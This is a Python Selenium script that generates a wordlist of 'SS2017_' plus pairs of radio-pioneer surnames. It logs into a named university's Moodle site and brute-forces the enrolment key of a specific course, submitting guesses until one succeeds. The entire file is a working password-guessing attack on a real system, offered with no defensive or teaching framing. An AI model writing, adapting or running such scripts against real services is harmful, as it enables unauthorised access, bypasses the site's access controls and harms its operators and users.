from selenium import webdriver
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By
import time

name = []
name.append('Hertz')
name.append('Hughes')
name.append('Tesla')
name.append('Popov')
name.append('Popow')
name.append('Marconi')
name.append('Pickard')
name.append('Poulsen')
name.append('Fessenden')
name.append('Forest')
name.append('Lodge')
name.append('Herrold')
name.append('Bose')
name.append('Baviera')


pre_password = 'SS2017_'

password = []

for n in name:
    for na in name:
        if n == na:
            continue
        password.append(pre_password + n + '_' + na)

# print(len(password))
#
# for l in range(len(password)):
#     print(password[l])

# driver = webdriver.Chrome(executable_path='C:/Program Files (x86)/Google/Chrome/Application/chromedriver.exe')
driver = webdriver.PhantomJS(executable_path='C:/Windows/phantomjs.exe')
driver.get("https://moodle.hs-augsburg.de/login/index.php")
time.sleep(1)
driver.find_element_by_id("username").send_keys('username')
time.sleep(1)
driver.find_element_by_id("password").send_keys('password')
time.sleep(1)
driver.find_element_by_id("loginbtn").submit()
time.sleep(1)
driver.get("https://moodle.hs-augsburg.de/enrol/index.php?id=1699")
time.sleep(1)
if driver.find_element_by_xpath('//*[@id="action-menu-toggle-0"]/span/span[1]').text == 'Li Lu':
    print('Login successful!')
else:
    print('failed')
    exit(0)

for l in range(len(password)):
    try:
        print('Trying with the password: ' + password[l])
        time.sleep(1)

        passwd = WebDriverWait(driver, timeout=10).until(EC.presence_of_element_located((By.ID, 'enrolpassword_8436')), message=u'over_time!')
        passwd.send_keys(password[l])

        btn = driver.find_element_by_id("id_submitbutton")
        btn.submit()

        time.sleep(5)
        driver.find_element_by_xpath('//*[@id="fitem_enrolpassword_8436"]/div[2]/span')
        print('failed!')
    except NoSuchElementException as e:
        print(password[l] + 'is the right password')
        break

driver.quit()